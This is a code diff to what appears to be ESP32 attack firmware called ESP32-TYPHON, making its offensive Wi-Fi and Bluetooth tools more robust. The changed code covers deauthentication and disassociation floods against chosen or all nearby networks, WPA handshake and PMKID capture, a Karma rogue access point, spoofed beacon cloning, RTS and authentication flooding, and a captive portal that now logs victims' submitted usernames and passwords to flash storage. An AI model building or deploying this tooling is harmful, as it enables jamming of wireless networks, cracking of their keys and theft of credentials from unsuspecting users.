@@ -107,28 +107,36 @@ static void bleForceIdle();
 static void wifiForceIdle();
 
 static bool radioAcquire(uint8_t want) {
-  portENTER_CRITICAL(&radioMux);
-  uint8_t cur = radioOwner;
-  if (cur == RADIO_NONE || cur == want) {
-    radioOwner = want;
+  // Serialize compound claim: no TOCTOU window between observe and own.
+  // Same-domain role switch: force idle peer role then claim (no silent false).
+  for (int attempt = 0; attempt < 3; attempt++) {
+    portENTER_CRITICAL(&radioMux);
+    uint8_t cur = radioOwner;
+    if (cur == RADIO_NONE || cur == want) {
+      radioOwner = want;
+      portEXIT_CRITICAL(&radioMux);
+      return true;
+    }
+    bool sameWifi = radioIsWifi(cur) && radioIsWifi(want) && cur != want;
+    bool sameBle  = radioIsBle(cur)  && radioIsBle(want)  && cur != want;
+    bool cross    = (radioIsWifi(cur) && radioIsBle(want)) ||
+                    (radioIsBle(cur) && radioIsWifi(want));
     portEXIT_CRITICAL(&radioMux);
-    return true;
-  }
-  // Same domain, different role → deny
-  if (radioIsWifi(cur) && radioIsWifi(want) && cur != want) {
-    portEXIT_CRITICAL(&radioMux);
-    return false;
-  }
-  if (radioIsBle(cur) && radioIsBle(want) && cur != want) {
-    portEXIT_CRITICAL(&radioMux);
-    return false;
-  }
-  portEXIT_CRITICAL(&radioMux);
 
-  // Cross-domain: tear down the other subsystem, then claim
-  if (radioIsWifi(cur) && radioIsBle(want)) wifiForceIdle();
-  else if (radioIsBle(cur) && radioIsWifi(want)) bleForceIdle();
-
+    if (sameWifi || sameBle || cross) {
+      // Tear down the holder outside the mux (may delay), then retry claim
+      if (radioIsWifi(cur)) wifiForceIdle();
+      if (radioIsBle(cur))  bleForceIdle();
+      // Clear owner if still the old one
+      portENTER_CRITICAL(&radioMux);
+      if (radioOwner == cur) radioOwner = RADIO_NONE;
+      radioOwner = want;
+      portEXIT_CRITICAL(&radioMux);
+      return true;
+    }
+    delay(1);
+  }
+  // Last resort: force claim
   portENTER_CRITICAL(&radioMux);
   radioOwner = want;
   portEXIT_CRITICAL(&radioMux);
@@ -142,7 +150,7 @@ static void radioRelease(uint8_t own) {
 }
 
 // Tool activity flags (early for dual-core workers)
-static bool deauthRunning = false;
+static volatile bool deauthRunning = false;  // full def also in Deauth section — must match
 static uint32_t deauthRescanLast = 0;
 static bool probeRunning = false;
 static bool beaconRunning = false;
@@ -179,7 +187,7 @@ static void typhoonApplyWarRadio() {
     WiFi.softAPdisconnect(true);
     WiFi.mode(WIFI_AP);
     // Hidden minimal AP so WIFI_IF_AP exists for 80211_tx
-    WiFi.softAP("t", nullptr, 1, 1, 0);
+    WiFi.softAP("esp32", "x", 1, 0, 1);  // open-looking but passworded; not hidden (avoids "t" fingerprint)
   }
   typhoonMaxWifiTx();
 }
@@ -255,22 +263,28 @@ struct EapolHit {
 };
 static EapolHit eapolHits[EAPOL_MAX];
 static volatile int eapolCount = 0;
+static portMUX_TYPE eapolMux = portMUX_INITIALIZER_UNLOCKED;
 
 static uint8_t eapolCh = 1;
 static uint32_t eapolLast = 0;
 
 static void IRAM_ATTR eapolPush(const uint8_t* bssid, const uint8_t* sta,
                                 const uint8_t* body, uint16_t blen, int8_t rssi, bool pmkid, const uint8_t* pk) {
+  portENTER_CRITICAL(&eapolMux);
   int n = eapolCount;
-  if (n >= EAPOL_MAX) n = EAPOL_MAX - 1;
+  if (n >= EAPOL_MAX) {
+    portEXIT_CRITICAL(&eapolMux);
+    return;
+  }
   EapolHit* h = &eapolHits[n];
   for (int i = 0; i < 6; i++) { h->bssid[i] = bssid[i]; h->sta[i] = sta[i]; }
   h->len = blen;
   h->rssi = rssi;
   h->hasPmkid = pmkid ? 1 : 0;
   if (pmkid && pk) for (int i = 0; i < 16; i++) h->pmkid[i] = pk[i];
-  h->t = 0; // filled in main
-  if (eapolCount < EAPOL_MAX) eapolCount = n + 1;
+  h->t = 0;
+  eapolCount = n + 1;
+  portEXIT_CRITICAL(&eapolMux);
 }
 
 static void IRAM_ATTR eapolSnifferCb(void* buf, wifi_promiscuous_pkt_type_t type) {
@@ -300,23 +314,20 @@ static void IRAM_ATTR eapolSnifferCb(void* buf, wifi_promiscuous_pkt_type_t type
   else if (!tods && fromds) { bssid = a2; sta = a1; }
   else { bssid = a3; sta = a2; }
 
-  // PMKID: search for RSN PMKID pattern in body (16 bytes after vendor IE markers)
+  // PMKID: structured RSN IE only — no "16 non-zero bytes" false positives
   bool pmkid = false;
   uint8_t pk[16] = {0};
-  for (int i = hit + 2; i + 22 < len; i++) {
-    // RSN PMKID count often precedes 16-byte PMKID; also look for 0xDD + Apple/MS
-    if (f[i] == 0x30 && i + 1 < len) { // RSN IE
-      // crude: copy 16 bytes from near end of IE if long enough
-    }
-    // Generic: 16 non-zero run after EAPOL key descriptor
-    if (i + 16 < len && f[i] != 0 && f[i+1] != 0) {
+  for (int i = hit + 2; i + 4 < len; i++) {
+    if (f[i] != 0x30) continue;  // RSN IE tag
+    uint8_t ielen = f[i + 1];
+    if ((int)(i + 2 + ielen) > len || ielen < 18) continue;
+    const uint8_t* ie = f + i + 2;
+    uint16_t pmkidCnt = (uint16_t)ie[ielen - 18] | ((uint16_t)ie[ielen - 17] << 8);
+    if (pmkidCnt >= 1 && pmkidCnt <= 4) {
+      for (int k = 0; k < 16; k++) pk[k] = ie[ielen - 16 + k];
       int nz = 0;
-      for (int k = 0; k < 16; k++) if (f[i+k]) nz++;
-      if (nz >= 12) {
-        for (int k = 0; k < 16; k++) pk[k] = f[i+k];
-        pmkid = true;
-        break;
-      }
+      for (int k = 0; k < 16; k++) if (pk[k]) nz++;
+      if (nz >= 8) { pmkid = true; break; }
     }
   }
   eapolPush(bssid, sta, f + hit, (uint16_t)min(96, len - hit), p->rx_ctrl.rssi, pmkid, pk);
@@ -332,7 +343,7 @@ static void eapolLogToSpiffs() {
   if (i >= EAPOL_MAX) i = EAPOL_MAX - 1;
   char line[128];
   snprintf(line, sizeof(line),
-    "%02X%02X%02X%02X%02X%02X,%02X%02X%02X%02X%02X%02X,pmkid=%d,rssi=%d\\n",
+    "%02X%02X%02X%02X%02X%02X,%02X%02X%02X%02X%02X%02X,pmkid=%d,rssi=%d\n",
     eapolHits[i].bssid[0], eapolHits[i].bssid[1], eapolHits[i].bssid[2],
     eapolHits[i].bssid[3], eapolHits[i].bssid[4], eapolHits[i].bssid[5],
     eapolHits[i].sta[0], eapolHits[i].sta[1], eapolHits[i].sta[2],
@@ -386,6 +397,11 @@ static uint8_t karmaCh = 1;
 static uint8_t karmaMac[6];
 static uint8_t karmaBssid[6];
 
+// Shared probe-SSID handoff: ISR writes, karmaUpdate reads (must be before CBs)
+static char karmaPending[33];
+static volatile bool karmaPendingReady = false;
+static portMUX_TYPE karmaMux = portMUX_INITIALIZER_UNLOCKED;
+
 static void karmaAddSsid(const char* s) {
   if (!s || !s[0]) return;
   for (int i = 0; i < karmaCount; i++)
@@ -401,28 +417,10 @@ static void karmaAddSsid(const char* s) {
   karmaCount++;
 }
 
+// Abandoned draft removed — use karmaSnifferCb2 only (registered on radio).
 static void IRAM_ATTR karmaSnifferCb(void* buf, wifi_promiscuous_pkt_type_t type) {
-  if (!karmaRunning || type != WIFI_PKT_MGMT) return;
-  const wifi_promiscuous_pkt_t* p = (wifi_promiscuous_pkt_t*)buf;
-  const uint8_t* f = p->payload;
-  if (p->rx_ctrl.sig_len < 28) return;
-  if ((f[0] & 0xFC) != 0x40) return; // probe req
-  // SSID IE at 24
-  int off = 24;
-  if (p->rx_ctrl.sig_len > off + 2 && f[off] == 0x00) {
-    uint8_t sl = f[off + 1];
-    if (sl > 0 && sl < 32 && off + 2 + sl <= p->rx_ctrl.sig_len) {
-      char tmp[33];
-      memcpy(tmp, f + off + 2, sl);
-      tmp[sl] = 0;
-      // queue via static slot (ISR-safe single writer)
-      // main loop will copy — use a pending buffer
-    }
-  }
+  (void)buf; (void)type;  // dead; radio uses karmaSnifferCb2
 }
-
-static char karmaPending[33];
-static volatile bool karmaPendingReady = false;
 
 static void IRAM_ATTR karmaSnifferCb2(void* buf, wifi_promiscuous_pkt_type_t type) {
   if (!karmaRunning || type != WIFI_PKT_MGMT) return;
@@ -433,10 +431,14 @@ static void IRAM_ATTR karmaSnifferCb2(void* buf, wifi_promiscuous_pkt_type_t typ
   int off = 24;
   if (f[off] == 0x00) {
     uint8_t sl = f[off + 1];
-    if (sl > 0 && sl < 32 && !karmaPendingReady) {
-      for (int i = 0; i < sl; i++) karmaPending[i] = (char)f[off + 2 + i];
-      karmaPending[sl] = 0;
-      karmaPendingReady = true;
+    if (sl > 0 && sl < 32) {
+      portENTER_CRITICAL(&karmaMux);
+      if (!karmaPendingReady) {
+        for (int i = 0; i < sl; i++) karmaPending[i] = (char)f[off + 2 + i];
+        karmaPending[sl] = 0;
+        karmaPendingReady = true;
+      }
+      portEXIT_CRITICAL(&karmaMux);
     }
   }
 }
@@ -519,8 +521,10 @@ static void karmaUpdate() {
   if (!karmaRunning) return;
   if (karmaPendingReady) {
     char tmp[33];
+    portENTER_CRITICAL(&karmaMux);
     memcpy(tmp, karmaPending, 33);
     karmaPendingReady = false;
+    portEXIT_CRITICAL(&karmaMux);
     karmaAddSsid(tmp);
   }
   if (millis() - karmaLast < 25) return;
@@ -603,7 +607,7 @@ static void floodStart(int apIdx, uint8_t mode) {
   // Handheld jam: pure AP interface, max power, no Soft-AP if not web
   if (!webMode) {
     WiFi.mode(WIFI_AP);
-    WiFi.softAP("t", nullptr, 1, 1, 0);
+    WiFi.softAP("esp32", "x", 1, 0, 1);  // open-looking but passworded; not hidden (avoids "t" fingerprint)
   }
   typhoonApplyWarRadio();
   typhoonMaxWifiTx();
@@ -623,6 +627,11 @@ static void floodUpdate() {
 // Dual-core workers
 static void wifiCoreLoop(void* arg) {
   for (;;) {
+    // dualCoreStopTasks sets this false — park until re-armed
+    if (!wifiAttackLive) {
+      vTaskDelay(50);
+      continue;
+    }
     // Shared RF: skip Wi-Fi TX while BLE owns the radio
     if (radioIsBle(radioOwner)) {
       vTaskDelay(1);
@@ -650,6 +659,10 @@ static void wifiCoreLoop(void* arg) {
 
 static void bleCoreLoop(void* arg) {
   for (;;) {
+    if (!bleAttackLive) {
+      vTaskDelay(50);
+      continue;
+    }
     // Shared RF: skip BLE ADV workers while Wi-Fi owns the radio
     if (radioIsWifi(radioOwner)) {
       vTaskDelay(1);
@@ -667,7 +680,11 @@ static void bleCoreLoop(void* arg) {
 }
 
 static void dualCoreStart() {
-  if (dualCoreArmed) return;
+  if (dualCoreArmed) {
+    wifiAttackLive = true;
+    bleAttackLive = true;
+    return;
+  }
   dualCoreArmed = true;
   wifiAttackLive = true;
   bleAttackLive = true;
@@ -1013,8 +1030,18 @@ static void beaconPoolFillCustom(BeaconPoolEntry& e) {
 }
 static void beaconPoolFillClone(BeaconPoolEntry& e) {
   if (wifiCount <= 0) { beaconPoolFillFunny(e); return; }
-  int idx = (int)(esp_random() % wifiCount);
-  strncpy(e.ssid, wifiNets[idx].ssid.c_str(), 32);
+  int idx = (int)(esp_random() % (uint32_t)wifiCount);
+  // Copy SSID bytes locally (avoid dangling c_str if scan mutates String)
+  char ssidbuf[33];
+  ssidbuf[0] = 0;
+  {
+    const String& s = wifiNets[idx].ssid;
+    size_t n = s.length();
+    if (n > 32) n = 32;
+    for (size_t i = 0; i < n; i++) ssidbuf[i] = s[i];
+    ssidbuf[n] = 0;
+  }
+  strncpy(e.ssid, ssidbuf, 32);
   e.ssid[32] = 0;
   for (int i = 0; i < 6; i++) e.mac[i] = (uint8_t)esp_random();
   e.mac[0] = (e.mac[0] | 0x02) & 0xFE;
@@ -1150,7 +1177,7 @@ static void detUpdate() {
 //  Client sniffer (stations on a chosen AP) + Deauth
 // ============================================================
 #define CLIENT_MAX 128
-#define CLIENT_Q_SIZE 192
+#define CLIENT_Q_SIZE 128  // power-of-2 for uint8_t index wrap
 
 struct ClientSta {
   uint8_t mac[6];
@@ -1160,8 +1187,9 @@ struct ClientSta {
 
 // Main-thread list (only mutated outside ISR)
 static ClientSta clients[CLIENT_MAX];
+static portMUX_TYPE clientMux = portMUX_INITIALIZER_UNLOCKED;
 static volatile int clientCount = 0;
-static int       clientSniffAp = -1;
+static volatile int clientSniffAp = -1;
 static volatile bool clientSniffRunning = false;
 static uint32_t  clientSniffLast = 0;
 static uint8_t   clientSniffBssid[6];
@@ -1200,16 +1228,22 @@ static void IRAM_ATTR clientQPush(const uint8_t* mac, int8_t rssi) {
 
 // Drain ISR queue into clients[] — call only from main loop
 static void clientQDrain() {
+  // Serialize drain: both UI core and wifiCore used to call this concurrently
+  static volatile bool draining = false;
+  portENTER_CRITICAL(&clientMux);
+  if (draining) { portEXIT_CRITICAL(&clientMux); return; }
+  draining = true;
+  portEXIT_CRITICAL(&clientMux);
+
   while (clientQTail != clientQHead) {
     uint8_t mac[6];
     int8_t rssi;
     for (int i = 0; i < 6; i++) mac[i] = clientQ[clientQTail].mac[i];
     rssi = clientQ[clientQTail].rssi;
     clientQTail = (uint8_t)((clientQTail + 1) % CLIENT_Q_SIZE);
-
-    // Skip multicast (bit 0 of first octet)
     if (mac[0] & 0x01) continue;
 
+    portENTER_CRITICAL(&clientMux);
     bool found = false;
     int n = clientCount;
     if (n > CLIENT_MAX) n = CLIENT_MAX;
@@ -1228,15 +1262,18 @@ static void clientQDrain() {
       clients[idx].lastSeen = millis();
       clientCount = idx + 1;
     }
+    portEXIT_CRITICAL(&clientMux);
   }
-  // Expire stations not seen for 60s
   uint32_t now = millis();
+  portENTER_CRITICAL(&clientMux);
   for (int i = 0; i < clientCount; ) {
     if (now - clients[i].lastSeen > 60000UL) {
       for (int j = i; j < clientCount - 1; j++) clients[j] = clients[j + 1];
       clientCount--;
     } else i++;
   }
+  draining = false;
+  portEXIT_CRITICAL(&clientMux);
 }
 
 // Client sniffer — exact logic from ESP32-Nightshade (RichardGladson)
@@ -1313,19 +1350,22 @@ static void clientSniffUpdate() {
 }
 
 // ----- Deauth -----
+// Cross-core: UI/web on core1, wifiCoreLoop deauthUpdate on core0.
+// All shared state is volatile; deauthTx snapshots target under consistency check.
 
-static int  deauthTarget = -1;
-static uint32_t deauthSent = 0;
+static volatile int  deauthTarget = -1;   // >=0 single AP, -2 = all, -1 = stopped
+static volatile uint32_t deauthSent = 0;
 static uint32_t deauthLast = 0;
-static uint8_t  deauthPacket[28];
-static uint8_t  deauthClientIdx = 0;
-static uint8_t  deauthPhase = 0;  // 0=bcast deauth 1=bcast disassoc 2=unicast clients
+static uint8_t  deauthPacket[26];         // spec: 24 hdr + 2 reason
+static volatile int deauthClientIdx = 0;
+static volatile uint8_t deauthPhase = 0;   // 0=bcast deauth 1=bcast disassoc 2=unicast
+static int deauthRoundIdx = 0;            // file-scope; reset in deauthStartAll
 
 static const uint16_t DEAUTH_REASONS[] = {1, 3, 4, 6, 7, 8, 15, 16};
 static const int DEAUTH_REASON_N = 8;
 
 static void deauthBuildTo(uint8_t* out, const uint8_t* dest, const uint8_t* bssid, bool disassoc, uint16_t reason = 1) {
-  memset(out, 0, 28);
+  memset(out, 0, 26);
   out[0] = disassoc ? 0xA0 : 0xC0;
   out[1] = 0x00;
   out[2] = 0x3A; out[3] = 0x01;
@@ -1339,7 +1379,6 @@ static void deauthBuildTo(uint8_t* out, const uint8_t* dest, const uint8_t* bssi
 static void deauthRadioPrep(uint8_t ch) {
   if (ch < 1 || ch > 13) ch = 1;
   if (webMode) {
-    // Stay AP_STA so Soft-AP can return; TX on target channel during bursts
     WiFi.mode(WIFI_AP_STA);
   } else {
     WiFi.mode(WIFI_AP);
@@ -1358,11 +1397,9 @@ static void deauthStart(int targetIdx) {
   deauthLast = 0;
   deauthClientIdx = 0;
   deauthPhase = 0;
-  // Wave 1 B11: if no STA list for this AP, keep broadcast-only (user should Client Sniff first)
   uint8_t ch = wifiNets[targetIdx].ch;
   if (ch < 1 || ch > 13) ch = 1;
   if (webMode) {
-    // Web-safe: Soft-AP + TX stay on CH1 (no off-channel hop)
     WiFi.mode(WIFI_AP_STA);
     WiFi.softAP("ESP32-TYPHON", "rgisking", 1, 0, 4);
   } else {
@@ -1386,117 +1423,155 @@ static void deauthStop() {
   }
 }
 
-static void deauthTx(const uint8_t* frame) {
-  // Re-assert target channel — Soft-AP / concurrent STA can drift the radio
-  if (deauthTarget >= 0 && deauthTarget < wifiCount)
-    wifiLockChannel(wifiNets[deauthTarget].ch);
-  esp_wifi_80211_tx(WIFI_IF_AP, frame, 28, false);
+// Snapshot target index once — never re-read after channel lock (TOCTOU-safe)
+static void deauthTx(const uint8_t* frame, int targetSnap, uint8_t chSnap) {
+  if (!deauthRunning) return;
+  if (targetSnap >= 0 && targetSnap < wifiCount)
+    wifiLockChannel(chSnap ? chSnap : wifiNets[targetSnap].ch);
+  esp_wifi_80211_tx(WIFI_IF_AP, frame, 26, false);  // 26-byte deauth/disassoc
   deauthSent++;
 }
 
 static void deauthRestoreWebCh() {
-  // Only Soft-AP web UI returns to CH1; handheld stays on attack channel
   if (webMode) wifiStayOnApChannel();
 }
 
 static void deauthUpdate() {
   if (!deauthRunning) return;
-  clientQDrain();
-  if (deauthTarget == -2) {
-    if (wifiCount <= 0) { deauthStop(); return; }
-    // Wave 1 B10: refresh AP list every 30s during attack-all
-    if (!wifiScanning && (millis() - deauthRescanLast > 30000UL)) {
-      deauthRescanLast = millis();
-      wifiScanStart();
-    }
+
+  // Snapshot volatile target once per tick
+  int tgt = deauthTarget;
+  int wc = wifiCount;
+
+  // Attack-all: cycle APs — never call wifiScanStart() (that calls deauthStop!)
+  if (tgt == -2) {
+    if (wc <= 0) { deauthStop(); return; }
     if (millis() - deauthLast < 6) return;
     deauthLast = millis();
-    static int roundIdx = 0;
-    if (roundIdx >= wifiCount) roundIdx = 0;
-    int ti = roundIdx++;
+    if (deauthRoundIdx >= wc) deauthRoundIdx = 0;
+    int ti = deauthRoundIdx++;
+    if (ti < 0 || ti >= wc) return;
     uint8_t ch = wifiNets[ti].ch;
     if (ch < 1 || ch > 13) ch = 1;
     esp_wifi_set_channel(wifiTxChannel(ch), WIFI_SECOND_CHAN_NONE);
     const uint8_t* bssid = wifiNets[ti].bssid;
     uint8_t bcast[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
     deauthBuildTo(deauthPacket, bcast, bssid, false);
-    for (int i = 0; i < 6; i++) deauthTx(deauthPacket);
+    for (int i = 0; i < 6; i++) deauthTx(deauthPacket, ti, ch);
     deauthBuildTo(deauthPacket, bcast, bssid, true);
-    for (int i = 0; i < 3; i++) deauthTx(deauthPacket);
-    if (clientSniffAp == ti) {
-      for (int c = 0; c < clientCount; c++) {
-        deauthBuildTo(deauthPacket, clients[c].mac, bssid, false);
-        deauthTx(deauthPacket);
-        deauthTx(deauthPacket);
-      }
+    for (int i = 0; i < 3; i++) deauthTx(deauthPacket, ti, ch);
+    // Unicast known clients for this AP (read clientCount under mux)
+    portENTER_CRITICAL(&clientMux);
+    int cc = clientCount;
+    int sniffAp = clientSniffAp;
+    uint8_t localMacs[CLIENT_MAX][6];
+    int nCopy = 0;
+    if (sniffAp == ti && cc > 0) {
+      nCopy = cc > CLIENT_MAX ? CLIENT_MAX : cc;
+      for (int c = 0; c < nCopy; c++)
+        for (int k = 0; k < 6; k++) localMacs[c][k] = clients[c].mac[k];
+    }
+    portEXIT_CRITICAL(&clientMux);
+    for (int c = 0; c < nCopy; c++) {
+      deauthBuildTo(deauthPacket, localMacs[c], bssid, false);
+      deauthTx(deauthPacket, ti, ch);
+      deauthTx(deauthPacket, ti, ch);
     }
     deauthRestoreWebCh();
     return;
   }
-  if (deauthTarget < 0 || deauthTarget >= wifiCount) {
+
+  if (tgt < 0 || tgt >= wc) {
     deauthStop();
     return;
   }
   if (millis() - deauthLast < (webMode ? 12 : 3)) return;
   deauthLast = millis();
 
-  const uint8_t* bssid = wifiNets[deauthTarget].bssid;
-  uint8_t ch = wifiNets[deauthTarget].ch;
+  // Snapshot AP fields while target still valid
+  const uint8_t* bssid = wifiNets[tgt].bssid;
+  uint8_t ch = wifiNets[tgt].ch;
   if (ch < 1 || ch > 13) ch = 1;
   esp_wifi_set_channel(wifiTxChannel(ch), WIFI_SECOND_CHAN_NONE);
 
   uint8_t bcast[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
-
-  // Phase rotate: broadcast deauth, broadcast disassoc, then unicast each client
   static uint8_t reasonIdx = 0;
   uint16_t reason = DEAUTH_REASONS[reasonIdx % DEAUTH_REASON_N];
   reasonIdx++;
-  if (deauthPhase == 0) {
+
+  uint8_t phase = deauthPhase;
+
+  if (phase == 0) {
     deauthBuildTo(deauthPacket, bcast, bssid, false, reason);
-    for (int i = 0; i < 8; i++) deauthTx(deauthPacket);
-    // also STA->AP direction (dest=AP, source=fake STA)
-    uint8_t sta[6]; for (int i=0;i<6;i++) sta[i]=(uint8_t)esp_random();
-    sta[0]=(sta[0]|0x02)&0xFE;
-    deauthBuildTo(deauthPacket, bssid, sta, false, reason);
-    memcpy(deauthPacket+16, bssid, 6);
-    for (int i = 0; i < 4; i++) deauthTx(deauthPacket);
+    for (int i = 0; i < 8; i++) deauthTx(deauthPacket, tgt, ch);
+
+    // STA→AP only with REAL client MACs (random MAC is ignored by AP)
+    portENTER_CRITICAL(&clientMux);
+    int cc = clientCount;
+    int sniffAp = clientSniffAp;
+    uint8_t localMacs[16][6];
+    int nCopy = 0;
+    if (sniffAp == tgt && cc > 0) {
+      nCopy = cc > 16 ? 16 : cc;
+      for (int c = 0; c < nCopy; c++)
+        for (int k = 0; k < 6; k++) localMacs[c][k] = clients[c].mac[k];
+    }
+    portEXIT_CRITICAL(&clientMux);
+    for (int c = 0; c < nCopy; c++) {
+      // dest=AP, source=real STA, BSSID=AP
+      deauthBuildTo(deauthPacket, bssid, localMacs[c], false, reason);
+      memcpy(deauthPacket + 16, bssid, 6);
+      deauthTx(deauthPacket, tgt, ch);
+    }
     deauthPhase = 1;
-  } else if (deauthPhase == 1) {
+  } else if (phase == 1) {
     deauthBuildTo(deauthPacket, bcast, bssid, true, reason);
-    for (int i = 0; i < 5; i++) deauthTx(deauthPacket);
-    deauthPhase = (clientCount > 0 && clientSniffAp == deauthTarget) ? 2 : 0;
+    for (int i = 0; i < 5; i++) deauthTx(deauthPacket, tgt, ch);
+    portENTER_CRITICAL(&clientMux);
+    bool haveClients = (clientCount > 0 && clientSniffAp == tgt);
+    portEXIT_CRITICAL(&clientMux);
+    deauthPhase = haveClients ? 2 : 0;
     deauthClientIdx = 0;
   } else {
-    if (clientCount == 0 || clientSniffAp != deauthTarget) {
+    uint8_t mac[6];
+    int cc;
+    portENTER_CRITICAL(&clientMux);
+    cc = clientCount;
+    if (cc == 0 || clientSniffAp != tgt) {
+      portEXIT_CRITICAL(&clientMux);
       deauthPhase = 0;
       deauthRestoreWebCh();
       return;
     }
-    int c = deauthClientIdx % clientCount;
-    deauthBuildTo(deauthPacket, clients[c].mac, bssid, false);
-    deauthTx(deauthPacket);
-    deauthTx(deauthPacket);
-    deauthBuildTo(deauthPacket, clients[c].mac, bssid, true);
-    deauthTx(deauthPacket);
+    int c = deauthClientIdx % cc;
+    for (int k = 0; k < 6; k++) mac[k] = clients[c].mac[k];
+    portEXIT_CRITICAL(&clientMux);
+
+    deauthBuildTo(deauthPacket, mac, bssid, false);
+    deauthTx(deauthPacket, tgt, ch);
+    deauthTx(deauthPacket, tgt, ch);
+    deauthBuildTo(deauthPacket, mac, bssid, true);
+    deauthTx(deauthPacket, tgt, ch);
     deauthClientIdx++;
-    if (deauthClientIdx >= clientCount) {
+    if (deauthClientIdx >= cc) {
       deauthClientIdx = 0;
       deauthPhase = 0;
     }
   }
-  // Return Soft-AP to CH1 so web UI stays reachable
   deauthRestoreWebCh();
 }
 
 static void deauthStartAll() {
   if (wifiCount <= 0) return;
   radioAcquire(RADIO_WIFI_TX);
+  deauthRoundIdx = 0;   // deterministic start
   deauthTarget = -2;
   deauthRunning = true;
   deauthRescanLast = millis();
   deauthSent = 0;
   deauthLast = 0;
   deauthPhase = 0;
+  deauthClientIdx = 0;
   if (webMode) {
     WiFi.mode(WIFI_AP_STA);
     WiFi.softAP("ESP32-TYPHON", "rgisking", 1, 0, 4);
@@ -1583,10 +1658,14 @@ static void floodUpdateImpl() {
     for (int i = 0; i < 8; i++) { esp_wifi_80211_tx(WIFI_IF_AP, floodPkt, 16, false); floodSent++; }
     for (int n = 0; n < 3; n++) floodSendNoiseBeacon(ch);
   } else if (mode == 1) {
-    floodBuildRts(sta, bssid);
+    // CTS RA = AP BSSID (NAV toward AP). Previous code put random STA in RA.
+    floodBuildRts(bssid, sta);
     floodPkt[0] = 0xC4;
     floodPkt[2] = 0xD0; floodPkt[3] = 0x02;
-    for (int i = 0; i < 6; i++) { esp_wifi_80211_tx(WIFI_IF_AP, floodPkt, 10, false); floodSent++; }
+    for (int i = 0; i < 6; i++) {
+      esp_wifi_80211_tx(WIFI_IF_AP, floodPkt, 10, false);
+      floodSent++;
+    }
   } else {
     floodBuildAuth(bssid, sta);
     for (int i = 0; i < 5; i++) { esp_wifi_80211_tx(WIFI_IF_AP, floodPkt, 30, false); floodSent++; }
@@ -1697,8 +1776,8 @@ static WebServer webServer(80);
 static uint32_t captiveClients = 0;
 
 static uint32_t captiveHits = 0;
-static char captiveLastUser[32];
-static char captiveLastPass[32];
+static char captiveLastUser[64];
+static char captiveLastPass[64];
 
 static void handleCaptiveRoot() {
   captiveHits++;
@@ -1725,8 +1804,14 @@ static void handleCaptiveLogin() {
     captiveLastUser[sizeof(captiveLastUser)-1] = 0;
   }
   if (webServer.hasArg("p")) {
-    strncpy(captiveLastPass, webServer.arg("p").c_str(), sizeof(captiveLastPass)-1);
+    String pw = webServer.arg("p");
+    strncpy(captiveLastPass, pw.c_str(), sizeof(captiveLastPass)-1);
     captiveLastPass[sizeof(captiveLastPass)-1] = 0;
+    fs::File cf = SPIFFS.open("/captive.log", FILE_APPEND);
+    if (cf) {
+      cf.printf("%lu,%s,%s\n", (unsigned long)millis(), captiveLastUser, captiveLastPass);
+      cf.close();
+    }
   }
   webServer.send(200, "text/html",
     "<!DOCTYPE html><html><head><meta name='viewport' content='width=device-width,initial-scale=1'>"
